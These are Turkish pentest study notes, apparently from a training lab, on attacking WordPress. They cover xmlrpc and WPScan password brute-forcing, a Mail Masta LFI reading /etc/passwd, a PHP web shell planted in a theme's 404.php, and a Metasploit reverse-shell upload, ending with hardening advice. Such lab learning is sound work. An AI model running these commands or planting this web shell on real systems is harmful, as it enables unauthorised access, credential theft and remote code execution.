---
title: "WordPress Saldırıları"
ana-not: "[[00_WordPress_İndeks]]"
tarih: 2026-11-19
aliases:
  - WordPress Saldırıları
tags:
  - siber-guvenlik
  - wordpress
  - brute-force
  - lfi
  - rce
  - metasploit
---

# WordPress Saldırıları

> ◀ [WordPress Keşif ve Numaralandırma](02_WordPress_Ke%C5%9Fif_ve_Numaraland%C4%B1rma.md) · 📚 [İndeks](00_WordPress_%C4%B0ndeks.md) · [WordPress Sertleştirme (Hardening)](04_WordPress_Sertle%C5%9Ftirme.md) ▶

## Giriş ve Kaba Kuvvet (Login & Brute Force) Saldırıları

Geçerli kullanıcıların bir listesini (user enumeration) elde ettikten sonra, WordPress arka ucuna (backend) erişim sağlamak için bir parola kaba kuvvet (brute-forcing) saldırısı başlatabiliriz.

Bu saldırı iki temel yol üzerinden gerçekleştirilebilir:
1. Standart giriş sayfası (`wp-login.php`) üzerinden.
2. **`xmlrpc.php`** sayfası üzerinden (Genellikle otomatik araçlar ve botnet'ler tarafından daha hızlı olduğu için tercih edilir).

---

## 🚀 `xmlrpc.php` Üzerinden Brute Force Testi (cURL)

Aşağıdaki örneklerde, `xmlrpc.php` dosyasına `wp.getUsersBlogs` metodunu kullanarak nasıl bir XML formatında POST isteği atılabileceği gösterilmiştir.

### 1. Geçerli Kimlik Bilgileri (Başarılı Giriş)
Eğer gönderdiğimiz POST isteği **doğru** kimlik bilgilerini (kullanıcı adı: `admin`, parola: `CORRECT-PASSWORD`) içeriyorsa, sunucu girişin başarılı olduğunu gösteren ve site bilgilerini içeren bir XML yanıtı döndürür:

```shell
$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

### 2. Geçersiz Kimlik Bilgileri (Başarısız Giriş - 403 Forbidden)
Eğer kimlik bilgileri **yanlışsa** (kullanıcı adı: `admin`, parola: `asdasd`), sunucu hatalı kullanıcı adı veya parola uyarısı barındıran bir `403 faultCode` yanıtı döndürür:

```shell
$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

---

> [!NOTE]
> **Sonuç: Manuel Bilgi Toplamanın (Enumeration) Önemi**
> Otomatik araçlar (WPScan, wfuzz vb.) sızma testi sürecini büyük ölçüde hızlandırsa da, değerlendirdiğimiz sistemler üzerindeki etkilerini anlamak bizim sorumluluğumuzdadır. Otomatik araçları kullanmaya çalışmadan önce **manuel yöntemleri** anlamak çok önemlidir. Manuel bilgi toplama yöntemlerini iyi kavramak, otomatik araçların düzgün çalışmadığı veya beklenmedik çıktılar verdiği durumlarda sorun gidermenize (troubleshooting) büyük ölçüde yardımcı olacaktır.

## WPScan ile WordPress Kullanıcı Brute Force Saldırısı

WPScan, WordPress sitelerinde kullanıcı adı ve şifre kaba kuvvet (brute force) saldırıları gerçekleştirmek için kullanılabilir. Daha önceki tarama raporlarında tespit edilen kullanıcılar (admin, roger ve david) bu aşamada hedef alınabilir.

WPScan iki tür giriş brute force saldırısı destekler:
- wp-login: Normal WordPress giriş sayfasını hedefler.
- xmlrpc: WordPress API'sini kullanarak istekleri /xmlrpc.php üzerinden gerçekleştirir ve daha hızlı olduğu için tercih edilir.

[XML-RPC Yöntemiyle Brute Force Komutu]
```bash
wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com
```

```bash
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://<HEDEF_IP>:<PORT>
```

[Parametre Açıklamaları]
- --password-attack xmlrpc: Saldırı türü olarak daha hızlı olan XML-RPC protokolünün kullanılacağını belirtir.
- -t 20: Eşzamanlı iş parçacığı (thread) sayısını 20 olarak ayarlar.
- -U admin,david: Hedef alınacak kullanıcı adlarını virgülle ayırarak belirtir.
- -P passwords.txt: Denenecek şifrelerin bulunduğu kelime listesi (wordlist) dosyasının yoludur.

[Başarılı Sonuç Çıktısı Örneği]
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01
[i] Valid Combinations Found:
| Username: admin, Password: sunshine1

## Mail Masta LFI Zafiyeti (Exploit Örneği)

WordPress üzerindeki mail-masta eklentisinde tespit edilen kimlik doğrulaması gerektirmeyen Local File Inclusion (LFI) zafiyetinin sömürülmesinde kullanılan örnek URL:
```bash
/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
[Açıklama ve Detaylar]
- Zafiyetli Dosya: /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php
- Parametre: pl=
- Zafiyet Türü: Unauthenticated Local File Inclusion (LFI)
- Hedef Dosya: /etc/passwd

## WordPress Tema Düzenleyici ile RCE (Remote Code Execution)

WordPress üzerinde yönetici (administrator) yetkilerine sahip olunduğunda, PHP kaynak kodları doğrudan değiştirilerek sistem komutları çalıştırılabilir (RCE).

## 🛠️ Saldırı Adımları

1. **Yönetim Paneline Giriş:** Yönetici kimlik bilgileriyle WordPress'e giriş yapılır.
2. **Tema Düzenleyiciye Erişim:** Sol menüden **Appearance (Görünüm)** > **Theme Editor (Tema Düzenleyici)** seçilir. Bu sayfa PHP dosyalarını doğrudan düzenlemeye izin verir.
3. **Pasif Tema Seçimi:** Ana temayı bozmamak için aktif olmayan (örneğin `Twenty Seventeen` gibi) kullanılmayan bir tema seçilmelidir.
4. **Dosya Düzenleme:** Değişiklik yapmak ve bir web shell eklemek için `404.php` gibi kritik olmayan bir dosya seçilir.

---

## 💉 PHP Dosyasına Web Shell Ekleme

Seçilen `404.php` dosyasının en üstüne (veya uygun bir yerine) sistem komutlarını çalıştıracak aşağıdaki PHP fonksiyonu eklenir:

```php
<?php system($_GET['cmd']); ?>
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 * <SNIP>
```

**Nasıl Çalışır?** Bu kod, URL üzerinden `cmd` GET parametresi ile gönderilen işletim sistemi komutlarını doğrudan çalıştırır. (Örn: `404.php?cmd=id`).

## 🎯 RCE Doğrulama ve Komut Çalıştırma

Kod kaydedildikten sonra, değiştirilen dosyanın yoluna giderek RCE'nin başarılı olup olmadığı doğrulanabilir. Tarayıcı üzerinden veya terminalden `cURL` ile istek atılabilir.

**Örnek cURL İsteği:**

```bash
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
Örnek:

```Plaintext
uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
```

```bash
curl -X GET "http://<HEDEF_IP>:<PORT>/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-user/flag.txt"
```

---
title: WordPress Metasploit ile Exploitation
tags:
  - pentest
  - metasploit
  - wordpress
  - web-exploitation
  - htb
aliases:
  - wp_admin_shell_upload
created: 2026-11-11
---

## WordPress Metasploit ile Exploitation

> [!NOTE]
> **Özet**
> `exploit/unix/webapp/wp_admin_shell_upload` modülü, geçerli bir WordPress hesabıyla sunucuda dosya yükleyip reverse shell almayı otomatize eder. Modülün çalışması için hesabın webshell oluşturabileceği yetkiye sahip olması gerekir.

## Gereksinimler

- Geçerli WordPress kullanıcı adı ve parolası
- Hesabın sunucuda dosya oluşturma yetkisi (genellikle yönetici)
- Hedefe erişilebilen bir saldırgan IP'si (LHOST)

## Metasploit'i Başlatma

```bash
msfconsole
```

## Modül Arama ve Seçme

```bash
search wp_admin
use 0          # Arama sonucundaki ID ile seçim
```

| # | Modül | Tarih | Rank | Check |
|---|-------|-------|------|-------|
| 0 | `exploit/unix/webapp/wp_admin_shell_upload` | 2015-02-21 | excellent | Evet |

## Seçenekleri İnceleme

```bash
options
```

| Seçenek | Zorunlu | Açıklama |
|---------|---------|----------|
| `PASSWORD` | Evet | WordPress parolası |
| `USERNAME` | Evet | WordPress kullanıcı adı |
| `RHOSTS` | Evet | Hedef host(lar) |
| `RPORT` | Evet | Hedef port (varsayılan 80) |
| `TARGETURI` | Evet | WordPress'in kök yolu (varsayılan `/`) |
| `SSL` | Hayır | HTTPS için `true` |
| `Proxies` | Hayır | Proxy zinciri |
| `VHOST` | Hayır | Sanal host adı |

> [!TIP]
> **İpucu**
> Varsayılan değerleri kontrol etmek için `show options` komutunu kullanın. Hedef HTTPS çalışıyorsa `SSL` değerini `true` yapmayı unutmayın.

## Parametreleri Ayarlama ve Çalıştırma

```bash
set rhosts <hedef-domain>
set username <kullanici-adi>
set password <parola>
set lhost <saldirgan-IP>
run
```

### Modülün Yaptıkları (Adım Adım)

1. Reverse TCP handler başlatılır
2. Verilen kimlik bilgileriyle WordPress'e giriş yapılır
3. Payload, bir eklenti dizinine yüklenir (`/wp-content/plugins/<rastgele>/`)
4. Payload tetiklenir ve Meterpreter oturumu açılır
5. Yüklenen PHP dosyası silinir (iz bırakmayı azaltmak için)

## Oturum Doğrulama

```bash
meterpreter > getuid
Server username: www-data (33)
```

> [!NOTE]
> **Yetki Seviyesi**
> Shell, web sunucusunun çalıştığı kullanıcının (`www-data`) yetkileriyle açılır. Bu, sistemde yerel yetki yükseltme (privilege escalation) gerektiğini gösterir.

## Sonraki Adımlar

- [Yetki Yükseltme](../Yetki%20Y%C3%BCkseltme/00_Yetki_Y%C3%BCkseltme.md) ile `www-data`'dan yükseltme
- Yapılandırma dosyalarında kimlik bilgisi arama (`wp-config.php`)
- Veritabanı erişimi ve kullanıcı hash'lerini inceleme

## Savunma Önerileri

> [!WARNING]
> **Korunma**
> - Güçlü ve benzersiz yönetici parolaları kullanın
> - Yönetici hesaplarında iki faktörlü doğrulama (2FA) etkinleştirin
> - Panelden eklenti/tema dosyası düzenlemeyi kapatın: `define('DISALLOW_FILE_EDIT', true);`
> - Eklenti ve tema yüklemelerini kısıtlayın, dosya uzantılarını doğrulayın
> - WordPress, eklentiler ve temalar için güncellemeleri zamanında uygulayın
> - Giriş denemelerini sınırlayan bir WAF veya brute-force koruması kullanın

## İlgili Notlar

- Metasploit ile Exploitation
- [WordPress Sertleştirme](04_WordPress_Sertle%C5%9Ftirme.md)
- Reverse Shell Türleri
- Meterpreter Temelleri

---

---
> ◀ [WordPress Keşif ve Numaralandırma](02_WordPress_Ke%C5%9Fif_ve_Numaraland%C4%B1rma.md) · 📚 [İndeks](00_WordPress_%C4%B0ndeks.md) · [WordPress Sertleştirme (Hardening)](04_WordPress_Sertle%C5%9Ftirme.md) ▶
